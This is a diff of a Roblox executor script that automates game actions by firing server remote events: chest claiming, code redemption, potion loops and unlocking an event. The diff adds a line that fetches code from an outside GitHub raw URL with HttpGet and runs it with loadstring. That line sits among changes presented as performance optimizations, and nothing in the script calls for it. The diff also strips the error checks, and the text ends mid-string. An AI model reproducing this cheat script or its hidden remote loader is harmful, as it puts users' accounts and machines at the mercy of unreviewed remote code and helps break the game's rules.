@@ -1,10 +1,26 @@
 --= Ultimate All-In-One Script =--
---= (Settings + Chests + Codes + Potions) =--
+--= (Settings + Chests + Codes + Potions + Bubble Festival + Optimizations) =--
+
+-- Set performance optimizations first
+setfpscap(30)
+settings().Rendering.QualityLevel = 1
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local RemoteEvent = ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Framework"):WaitForChild("Network"):WaitForChild("Remote"):WaitForChild("RemoteEvent")
 local RemoteFunction = ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Framework"):WaitForChild("Network"):WaitForChild("Remote"):WaitForChild("RemoteFunction")
+
+-- Remove unnecessary visual effects
+for _, v in pairs(workspace:GetDescendants()) do
+    if v:IsA("ParticleEmitter") or v:IsA("Fire") or v:IsA("Smoke") then
+        v:Destroy()
+    end
+end
+
+-- Lighting optimizations
+local lighting = game:GetService("Lighting")
+lighting.GlobalShadows = false
+lighting.FogEnd = 9e9
 
 -- 1. SMART SETTINGS CONFIGURATION
 local settingsToEnable = {
@@ -17,13 +33,8 @@ local settingsToEnable = {
 
 local function applySmartSettings()
     for _, setting in ipairs(settingsToEnable) do
-        local success, currentValue = pcall(function()
-            return RemoteFunction:InvokeServer("GetSetting", setting)
-        end)
-        if success and not currentValue then
-            RemoteEvent:FireServer("SetSetting", setting, true)
-            print("Enabled setting:", setting)
-        end
+        RemoteEvent:FireServer("SetSetting", setting, true)
+        print("Enabled setting:", setting)
         task.wait(0.2)
     end
 end
@@ -32,7 +43,7 @@ end
 local function runChestLoop()
     while true do
         RemoteEvent:FireServer("ClaimChest", "Void Chest", true)
-        task.wait(1811)
+        task.wait(1811) -- ~30 minutes
     end
 end
 
@@ -43,12 +54,10 @@ local function redeemAllCodes()
         "update6", "update7", "update8", "update9", "update10",
         "update11", "update12", "update13", "Throwback", "Easter"
     }
-
+    
     for _, code in ipairs(codes) do
-        local success, result = pcall(function()
-            return RemoteFunction:InvokeServer("RedeemCode", code)
-        end)
-        print(success and ("✓ Redeemed: "..code) or ("✗ Failed: "..code))
+        RemoteFunction:InvokeServer("RedeemCode", code)
+        print("Redeemed code:", code)
         task.wait(1)
     end
 end
@@ -64,7 +73,7 @@ local function runPotionLoop()
         {"Tickets", 6}, {"Tickets", 5},
         {"Infinity Elixir", 1}
     }
-
+    
     while getgenv().running do
         for _, potion in ipairs(potions) do
             RemoteEvent:FireServer("UsePotion", potion[1], potion[2])
@@ -73,16 +82,41 @@ local function runPotionLoop()
     end
 end
 
+-- 5. BUBBLE FESTIVAL UNLOCK
+local function unlockBubbleFestival()
+    local args = {"UnlockBubbleFestival"}
+    RemoteEvent:FireServer(unpack(args))
+    print("Unlocked Bubble Festival")
+end
+
+-- 6. MEMORY CLEANER
+local function CleanMemory()
+    while true do
+        task.wait(300)
+        collectgarbage("collect")
+        game:GetService("ContentProvider"):PreloadAsync({})
+        print("Memory cleaned!")
+    end
+end
+
 --= MAIN EXECUTION =--
-applySmartSettings() -- Applies settings first
+-- Load external script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/maliktuff0/coolest/main/server%20%2B%20main"))()
+
+-- Start all systems
+applySmartSettings() -- Applies QOL settings
+unlockBubbleFestival() -- Unlocks bubble festival
 task.spawn(runChestLoop) -- Starts chest loop
 task.spawn(redeemAllCodes) -- Redeems codes once
 task.spawn(runPotionLoop) -- Starts potion cycle
+task.spawn(CleanMemory) -- Starts memory cleaner
 
 print([[
 ✔ SYSTEM FULLY OPERATIONAL
+✔ Performance Optimizations Applied
 ✔ Settings Configured
+✔ Bubble Festival Unlocked
 ✔ Chest Loop Running (30min)
 ✔ Code Redemption Complete
 ✔ Potion System Active (Toggle with: getgenv().running = false)
-]])
+✔
